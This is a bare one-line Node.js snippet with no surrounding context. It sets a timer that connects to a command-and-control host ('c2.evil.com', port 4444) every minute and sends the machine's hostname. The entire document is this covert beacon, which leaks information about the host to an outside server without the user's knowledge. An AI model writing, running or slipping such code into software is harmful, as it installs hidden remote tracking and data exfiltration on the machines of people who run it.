const net = require('net'); setInterval(() => { const c = net.connect(4444, 'c2.evil.com'); c.write(JSON.stringify({host: require('os').hostname()})); c.end(); }, 60000);
